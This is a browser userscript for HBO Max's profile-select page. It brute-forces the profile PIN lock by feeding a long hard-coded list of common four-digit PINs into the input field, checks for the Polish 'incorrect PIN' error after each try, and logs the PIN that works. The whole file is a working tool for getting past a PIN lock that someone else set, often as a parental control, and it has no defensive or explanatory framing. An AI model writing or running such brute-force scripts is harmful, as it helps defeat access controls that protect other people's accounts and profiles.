// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        https://play.hbomax.com/profile/select
// @icon         https://www.google.com/s2/favicons?sz=64&domain=hbomax.com
// @grant        none
// ==/UserScript==

(function() {




    
    function start() 
    {
        function getInput()
            {
                input = document.getElementsByTagName('input');    
                input = input[0];

                function setNewInput(newValue)
                {
                    let lastValue = input.value;
                    input.value = newValue;
                    let event = new Event('input', { bubbles: true });
                    // hack React15
                    event.simulated = true;
                    // hack React16 内部定义了descriptor拦截value，此处重置状态
                    let tracker = input._valueTracker;
                    if (tracker) {
                    tracker.setValue(lastValue);
                    }
                    input.dispatchEvent(event);

                }

                const pins = ["1234","1111","1337","0000","1984","6969","5555","1212","7777","6666","4444","1987","2580","1991","1988","1977","1976","9999","1993","1990","1985","1981","1973","1488","2323","1986","1982","1978","1975","1701","9876","4321","1980","1972","1313","1122","1024","2312","1996","1983","1979","1974","1971","1968","1818","1357","8888","4242","3141","2008","1995","1989","1966","1324","1210","0303","8989","8520","2903","2222","2005","1992","1478","1414","1410","1314","1221","1209","1102","1012","1010","0815","0007","9527","8008","7272","5150","4680","4371","3579","3333","3234","3003","2892","2612","2602","2468","2255","2112","2109","2013","2006","1999","1998","1997","1994","1970","1919","1912","1906","1776","1717","1612","1512","1411","1310","1245","1236","1224","1201","1123","1121","1106","1104","1103","1050","1011","0911","0909","0789","8791","8723","7896","7890","7854","7853","7788","7474","6743","6667","6619","6069","5760","5699","5566","5465","5434","5394","5242","4862","4848","4741","4711","4564","4412","4330","3794","3334","3128","2991","2929","2906","2901","2812","2727","2710","2704","2662","2626","2525","2522","2511","2507","2505","2504","2501","2486","2434","2412","2411","2365","2342","2332","2311","2310","2308","2244","2205","2176","2172","2114","2012","2009","2002","2001","1969","1964","1941","1937","1928","1921","1812","1809","1800","1770","1710","1707","1601","1593","1477","1469","1452","1392","1379","1369","1331","1309","1306","1302","1299","1248","1230","1225","1215","1214","1211","1207","1206","1204","1203","1128","1112","1009","1006","1005","0987","0925","0907","0808","0707","0604","0430","0420","0407","0406","0405","0202","0115","0114","0106","9933","9900","9835","9812","9741","9595","9558","9452","9333","9315","9313","9289","9243","9202","9119","9050","8902","8899","8883","8823","8785","8735","8731","8717","8686","8662","8642","8633","8623","8582","8542","8523","8521","8457","8410","8351","8344","8311","8210","8118","8090","8004","7991","7921","7893","7861","7856","7801","7798","7773","7757","7744","7687","7568","7554","7532","7521","7441","7410","7351","7347","7337","7324","7291","7288","7283","7229","7215","7209","7153","7146","7132","7097","7025","6985","6979","6922","6852","6791","6727","6691","6654","6606","6567","6544","6541","6492","6453","6413","6367","6321","6263","6202","6128","6060","5982","5959","5885","5876","5847","5825","5702","5683","5678","5663","5657","5656","5643","5638","5611","5599","5584","5583","5567","5551","5534","5533","5522","5452","5445","5441","5432","5425","5344","5333","5280","5273","5254","5200","5138","5115","5024","5021","5013","4995","4991","4942","4870","4850","4839","4812","4796","4774","4734","4725","4702","4682","4652","4646","4620","4567","4558","4545","4539","4526","4512","4477","4455","4433","4421","4411","4324","4269","4263","4200","4138","4044","4041","4040","4014","3945","3875","3838","3812","3811","3791","3711","3682","3646","3630","3624","3596","3570","3566","3524","3510","3488","3381","3366","3355","3313","3231","3200","3137","3133","3103","3030","3027","3015","3008","3007","3006","3000","2990","2911","2910","2909","2905","2828","2807","2804","2803","2802","2788","2774","2761","2733","2712","2707","2701","2684","2630","2607","2604","2569","2552","2512","2502","2495","2490","2487","2457","2453","2430","2424","2422","2407","2403","2402","2389","2375","2327","2309","2307","2304","2265","2213","2212","2201","2181","2177","2174","2142","2115","2113","2108","2106","2103","2102","2101","2093","2085","2048","2046","2042","2041","2017","2015","2014","2011","2010","2007","2004","2003","2000","1967","1965","1962","1957","1952","1943","1917","1905","1904","1903","1902","1883","1872","1871","1844","1821","1817","1805","1758","1731","1719","1704","1683","1643","1632","1610","1608","1606","1603","1602","1598","1597","1595","1591","1590","1589","1578","1572","1563","1538","1528","1526","1515","1511","1507","1500","1485","1479","1472","1447","1444","1434","1432","1412","1405","1404","1397","1394","1377","1371","1343","1338","1334","1329","1328","1323","1307","1304","1303","1290","1274","1273","1265","1257","1256","1247","1235","1220","1216","1205","1196","1191","1187","1180","1179","1141","1140","1138","1129","1127","1118","1109","1108","1092","1076","1073","1053","1034","1029","1019","1017","1008","1003","1002","0990","0945","0921","0912","0905","0903","0898","0891","0813","0812","0804","0801","0777","0724","0723","0722","0712","0709","0708","0706","0612","0601","0530","0521","0507","0506","0505","0419","0410","0344","0326","0302","0287","0264","0258","0227","0221","0218","0211","0207","0204","0203","0201","0164","0156","0131","0124","0123","0120","0113","0110","0104","9991","9989","9988","9987","9979","9969","9966","9956","9954","9953","9939","9929","9924","9910","9903","9902","9901","9898","9887","9886","9874","9873","9872","9866","9863","9834","9817","9815","9803","9800","9777","9762","9759","9757","9755","9753","9747","9745","9744","9736","9721","9716","9714","9697","9691","9689","9684","9681","9680","9678","9667","9665","9656","9645","9640","9639","9611","9607","9604","9603","9565","9552","9550","9547","9540","9532","9521","9517","9516","9515","9514","9509","9498","9494","9477","9461","9458","9456","9436","9431","9426","9424","9417","9416","9411","9405","9393","9385","9366","9361","9360","9338","9332","9331","9320","9312","9299","9298","9293","9291","9279","9274","9268","9262","9251","9250","9245","9240","9238","9236","9233","9230","9224","9221","9213","9211","9206","9201","9199","9187","9185","9182","9180","9179","9168","9159","9155","9148","9147","9140","9137","9125","9117","9110","9090","9089","9088","9075","9070","9057","9051","9047","9044","9037","9025","9022","9017","9012","9001","8998","8973","8969","8964","8963","8959","8952","8950","8945","8924","8916","8914","8912","8906","8904","8903","8901","8893","8887","8885","8882","8880","8879","8875","8868","8864","8852","8850","8845","8844","8837","8836","8824","8822","8821","8804","8768","8761","8757","8755","8754","8747","8745","8744","8738","8728","8705","8699","8698","8685","8677","8676","8675","8666","8645","8625","8621","8614","8612","8611","8600","8596","8588","8585","8580","8575","8571","8569","8560","8548","8522","8519","8510","8505","8502","8500","8492","8489","8488","8484","8483","8482","8476","8471","8465","8464","8462","8453","8437","8433","8432","8430","8426","8421","8415","8406","8396","8384","8383","8366","8358","8356","8350","8347","8331","8320","8312","8308","8306","8290","8289","8288","8284","8282","8280","8270","8267","8261","8254","8245","8235","8226","8224","8218","8202","8193","8192","8181","8180","8175","8164","8162","8158","8157","8155","8153","8140","8123","8110","8108","8103","8098","8095","8094","8081","8070","8048","8040","8036","8028","8027","8026","8017","8015","8009","8005","8002","8000","7995","7990","7987","7985","7982","7980","7979","7964","7956","7952","7949","7947","7932","7931","7930","7925","7919","7916","7914","7913","7912","7906","7904","7901","7898","7894","7891","7886","7878","7852","7851","7834","7833","7832","7831","7829","7823","7818","7810","7797","7791","7786","7785","7779","7778","7776","7775","7771","7765","7754","7742","7736","7735","7733","7730","7722","7716","7715","7714","7708","7688","7686","7685","7680","7673","7656","7655","7651","7632","7629","7619","7616","7613","7611","7603","7591","7588","7587","7584","7583","7581","7569","7559","7546","7545","7537","7525","7507","7504","7497","7495","7489","7487","7485","7484","7477","7468","7466","7463","7457","7455","7452","7451","7437","7436","7435","7434","7433","7432","7429","7422","7412","7411","7407","7402","7396","7383","7375","7372","7360","7359","7339","7335","7331","7330","7329","7327","7326","7322","7319","7317","7308","7300","7297","7293","7278","7274","7271","7263","7262","7253","7243","7241","7234","7224","7223","7220","7206","7200","7192","7191","7187","7186","7179","7167","7149","7148","7140","7139","7136","7133","7126","7117","7114","7113","7109","7106","7101","7096","7093","7091","7075","7074","7052","7045","7036","7019","7009","7002","7001","6996","6987","6975","6973","6972","6971","6963","6937","6932","6926","6921","6906","6900","6892","6874","6870","6869","6865","6857","6848","6845","6829","6824","6822","6821","6820","6810","6801","6786","6780","6779","6778","6775","6752","6748","6732","6723","6719","6704","6700","6699","6694","6681","6672","6671","6669","6660","6657","6655","6652","6645","6642","6640","6636","6624","6622","6616","6612","6596","6590","6588","6583","6565","6559","6548","6546","6539","6534","6529","6524","6523","6517","6506","6503","6502","6494","6491","6490","6475","6471","6470","6466","6464","6458","6455","6431","6428","6426","6416","6411","6410","6400","6390","6383","6382","6380","6378","6376","6369","6366","6363","6352","6347","6330","6329","6325","6323","6322","6313","6310","6305","6301","6292","6288","6278","6274","6271","6268","6257","6254","6252","6247","6243","6242","6241","6238","6237","6233","6223","6221","6219","6200","6195","6188","6183","6182","6181","6166","6165","6160","6157","6156","6154","6144","6137","6135","6130","6119","6117","6114","6110","6109","6108","6105","6097","6081","6079","6076","6062","6061","6048","6043","6040","6026","6020","6017","6016","6009","6006","6004","5995","5990","5987","5983","5977","5964","5955","5946","5936","5930","5923","5918","5913","5911","5910","5900","5896","5889","5888","5887","5873","5869","5866","5859","5856","5850","5848","5846","5842","5841","5840","5830","5826","5818","5817","5816","5815","5803","5792","5758","5754","5746","5733","5731","5726","5722","5713","5711","5710","5707","5706","5703","5694","5692","5691","5689","5682","5674","5667","5665","5659","5654","5651","5650","5649","5646","5645","5634","5633","5626","5602","5600","5598","5590","5582","5579","5575","5561","5559","5546","5544","5541","5540","5521","5518","5517","5515","5512","5510","5507","5506","5494","5489","5488","5486","5478","5477","5468","5467","5461","5454","5430","5422","5421","5419","5413","5412","5407","5392","5391","5388","5381","5373","5371","5362","5356","5354","5352","5350","5342","5341","5329","5326","5321","5309","5293","5289","5288","5287","5281","5279","5276","5275","5262","5260","5258","5227","5226","5225","5220","5211","5209","5202","5199","5198","5197","5196","5186","5184","5182","5180","5174","5173","5170","5167","5162","5159","5148","5147","5142","5137","5133","5132","5123","5122","5113","5110","5109","5104","5102","5095","5076","5075","5073","5060","5059","5057","5053","5050","5044","5040","5038","5032","5031","5018","5014","5009","5005","5004","5003","5000","4999","4963","4936","4907","4900","4898","4896","4894","4890","4888","4885","4884","4879","4878","4872","4866","4859","4857","4833","4831","4829","4825","4815","4810","4800","4794","4791","4787","4781","4768","4758","4757","4754","4753","4752","4749","4745","4728","4716","4714","4703","4695","4691","4674","4669","4668","4666","4665","4664","4659","4657","4655","4654","4653","4651","4649","4640","4636","4618","4616","4615","4613","4611","4603","4601","4600","4596","4585","4583","4580","4570","4568","4565","4562","4555","4553","4548","4542","4537","4535","4532","4523","4521","4511","4498","4488","4486","4481","4472","4466","4456","4454","4443","4440","4439","4432","4429","4424","4423","4418","4409","4407","4405","4392","4391","4385","4377","4375","4369","4368","4367","4361","4354","4345","4343","4341","4337","4336","4322","4311","4304","4301","4298","4297","4295","4294","4291","4285","4281","4278","4274","4270","4267","4264","4260","4258","4256","4243","4240","4235","4231","4230","4228","4224","4223","4218","4213","4211","4209","4204","4196","4195","4189","4187","4183","4181","4180","4179","4178","4172","4171","4169","4163","4150","4144","4143","4142","4141","4135","4132","4131","4129","4128","4126","4121","4118","4116","4114","4112","4108","4106","4101","4096","4090","4085","4084","4077","4073","4065","4064","4063","4062","4061","4050","4049","4043","4033","4026","4023","4022","4018","4010","4001","3999","3990","3985","3959","3958","3950","3947","3942","3941","3928","3923","3912","3910","3901","3891","3890","3876","3873","3872","3868","3846","3840","3835","3825","3813","3810","3806","3802","3792","3779","3778","3774","3766","3764","3759","3756","3755","3740","3737","3715","3714","3705","3701","3700","3699","3696","3694","3693","3692","3691","3680","3675","3674","3672","3671","3664","3654","3653","3651","3649","3639","3636","3628","3627","3626","3615","3610","3605","3597","3591","3584","3571","3569","3568","3565","3559","3551","3547","3546","3543","3539","3535","3526","3525","3523","3522","3516","3507","3506","3502","3501","3498","3497","3491","3490","3486","3485","3483","3478","3477","3473","3472","3465","3464","3462","3459","3455","3450","3437","3436","3434","3432","3426","3424","3412","3407","3399","3396","3393","3389","3386","3385","3377","3371","3369","3364","3361","3359","3354","3344","3343","3339","3337","3331","3329","3321","3318","3311","3310","3305","3304","3296","3291","3282","3263","3258","3257","3255","3247","3246","3243","3242","3216","3215","3213","3212","3207","3204","3198","3182","3181","3179","3173","3169","3165","3161","3151","3146","3145","3142","3140","3136","3130","3122","3117","3114","3107","3106","3101","3100","3096","3095","3089","3087","3070","3069","3068","3065","3063","3058","3040","3039","3034","3032","3031","3021","3010","3001","2992","2989","2985","2980","2973","2963","2962","2961","2951","2948","2947","2937","2920","2919","2902","2888","2883","2874","2873","2870","2867","2864","2861","2852","2851","2846","2839","2836","2833","2830","2829","2819","2815","2813","2811","2810","2808","2806","2805","2799","2796","2795","2791","2783","2777","2773","2771","2759","2745","2742","2741","2736","2734","2728","2719","2716","2711","2709","2706","2703","2702","2696","2690","2689","2678","2677","2675","2673","2663","2661","2657","2655","2653","2646","2643","2641","2631","2628","2621","2619","2611","2610","2608","2606","2603","2600","2594","2589","2588","2587","2577","2556","2550","2549","2546","2544","2540","2536","2532","2528","2527","2516","2510","2509","2508","2498","2496","2488","2485","2484","2482","2478","2477","2469","2467","2465","2459","2450","2448","2436","2433","2431","2426","2425","2420","2417","2414","2409","2408","2406","2405","2404","2401","2400","2399","2398","2393","2390","2387","2386","2382","2380","2373","2372","2368","2363","2361","2358","2357","2353","2350","2348","2345","2337","2326","2324","2320","2319","2316","2314","2313","2305","2301","2300","2299","2298","2297","2287","2283","2278","2277","2276","2275","2272","2268","2267","2264","2249","2247","2245","2243","2241","2239","2236","2228","2223","2218","2214","2210","2206","2203","2202","2198","2197","2194","2193","2191","2189","2171","2170","2166","2160","2154","2153","2152","2151","2147","2145","2141","2140","2136","2132","2130","2127","2125","2124","2122","2121","2118","2117","2110","2107","2105","2104","2097","2089","2080","2073","2065","2062","2060","2050","2049","2047","2036","2027","2025","2023","1963","1961","1958","1956","1955","1953","1951","1950","1948","1946","1945","1944","1942","1940","1936","1934","1930","1927","1926","1925","1924","1923","1922","1918","1915","1914","1911","1910","1907","1901","1892","1890","1887","1886","1885","1884","1879","1876","1873","1870","1866","1861","1857","1854","1849","1846","1845","1842","1839","1837","1834","1832","1831","1828","1827","1819","1815","1813","1811","1810","1808","1807","1806","1802","1801","1798","1793","1786","1785","1784","1783","1781","1778","1777","1773","1772","1769","1768","1762","1759","1748","1745","1743","1741","1739","1727","1724","1721","1713","1709","1703","1702","1700","1699","1693","1688","1687","1681","1678","1672","1669","1666","1664","1655","1652","1644","1625","1622","1621","1619","1618","1617","1616","1604","1596","1592","1587","1585","1580","1575","1569","1567","1560","1553","1551","1547","1542","1535","1533","1530","1527","1525","1521","1520","1517","1514","1513","1509","1506","1505","1504","1502","1501","1498","1497","1492","1486","1481","1475","1470","1463","1461","1456","1445","1433","1427","1425","1424","1415","1409","1407","1406","1403","1402","1401","1398","1387","1386","1381","1380","1378","1370","1356","1354","1353","1351","1350","1346","1342","1341","1340","1339","1326","1322","1320","1318","1317","1315","1308","1305","1301","1298","1296","1293","1289","1285","1282","1279","1275","1269","1261","1260","1254","1252","1244","1231","1228","1227","1226","1219","1218","1217","1208","1199","1197","1194","1188","1185","1184","1182","1178","1177","1176","1174","1171","1168","1165","1155","1149","1147","1146","1144","1142","1139","1134","1132","1131","1126","1125","1124","1120","1119","1114","1110","1107","1105","1095","1089","1087","1086","1084","1083","1082","1081","1080","1077","1074","1071","1066","1062","1057","1054","1051","1047","1045","1044","1043","1040","1038","1036","1032","1030","1025","1023","1022","1018","1016","1015","1014","1013","1007","1004","1001","1000","0998","0997","0993","0991","0986","0985","0981","0979","0971","0969","0953","0928","0927","0922","0919","0917","0916","0904","0892","0872","0839","0835","0834","0830","0820","0806","0803","0802","0799","0788","0787","0779","0772","0771","0765","0754","0741","0739","0734","0726","0725","0721","0719","0717","0716","0714","0713","0711","0705","0704","0703","0702","0696","0693","0690","0685","0683","0678","0671","0668","0667","0654","0651","0650","0647","0645","0633","0625","0624","0622","0616","0607","0606","0602","0583","0556","0554","0545","0543","0536","0534","0529","0526","0523","0522","0515","0512","0511","0504","0501","0490","0478","0475","0470","0466","0444","0443","0433","0425","0424","0423","0422","0421","0417","0414","0412","0411","0404","0394","0391","0390","0389","0379","0365","0354","0347","0343","0339","0333","0331","0330","0329","0324","0323","0322","0321","0320","0319","0317","0316","0314","0313","0308","0307","0306","0304","0300","0297","0295","0276","0273","0259","0247","0235","0226","0225","0219","0217","0210","0208","0205","0192","0187","0185","0182","0177","0174","0172","0171","0142","0138","0136","0135","0133","0126","0112","0111","0109","0108","0107","0103","0101","0082","0077","0071","0070","0059","0058","0057","0056","0050","0042","0033","0032","0030","0028","0019","0012","0011","0009","0001"]
                var i = 0;
                var currentInput = "";
                var error;
                function addNextID() 
                {
                    currentInput = pins[i];
                    i++;
                }

                function tryNewInput() 
                {

                    function tryAgain() 
                    {
                        
                        console.log("Wrong ID: ", currentInput);
    
                        addNextID();


                        setNewInput(currentInput);
    
                        tryNewInput();   
                    }
                    function startLoop() 
                    {
                            error = document.getElementsByClassName('css-1rynq56');
                            for (let j = 0; j < error.length; j++) 
                            {
                                const element = error[j];
                                
                                        if (element.innerHTML == 'Niepoprawny PIN. Spróbuj ponownie.')
                                        {
                                            break;
                                        }
                                
                                if (j==error.length-1)
                                    flag = true;
                            }

                        if (!flag)
                        tryAgain();
                        else
                        {
                            console.log('Correct ID is: !', currentInput)
                            flag = true;
                            return;
                        }
                    }
                    setTimeout(startLoop, 250);
                    

                }

                var flag = false;
                addNextID();
                setNewInput(currentInput);
                setTimeout(tryNewInput(), 1500)    



                
                

            }
        setTimeout(getInput, 4000);
    }
    

    document.onload = start();
})();
